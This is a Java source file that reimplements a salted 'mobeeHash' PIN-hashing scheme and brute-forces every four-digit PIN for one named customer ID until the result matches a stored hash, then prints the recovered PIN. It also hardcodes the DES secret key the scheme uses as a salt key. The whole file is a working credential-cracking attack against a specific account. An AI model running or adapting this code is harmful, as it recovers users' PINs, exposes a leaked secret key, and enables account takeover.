package com.ceva.aestools;
import org.apache.commons.lang.StringUtils;

public class testsecurity {

	public static String generateMobeeHash(String customerId, String password)
			throws Exception {
		if ((customerId == null) || (password == null)
				|| (customerId.isEmpty()) || (password.isEmpty())) {
			throw new Exception("Invalid input");
		}
		try {
			String _salt = new DESEncrypter().encrypt(customerId.trim(),
					"Manam@*63636Mirchi%^&*KCB");
			byte[] saltBytes = _salt.getBytes();
			return HashGenerator.getHash(password.trim(), saltBytes).trim();
		} catch (Exception e) {
			throw new Exception("Unable to generate mobeeHash "
					+ e.getMessage());
		}
	}

	public static void main(String[] args) throws Exception {
		int i = 0;
		String gotPin = "";
		for (; i <= 9999; i++) {

			String pin = StringUtils.leftPad(String.valueOf(i), 4, '0');

			String val = generateMobeeHash("20230335", pin);
			System.out.println(pin);

			if (val.contains("/CFRqEq+CKNxzvzjv9mWXiABr6Y=")) {
				gotPin = pin;
				break;
			}

		}

		System.out.println("=====================================>" + gotPin);
	}
}
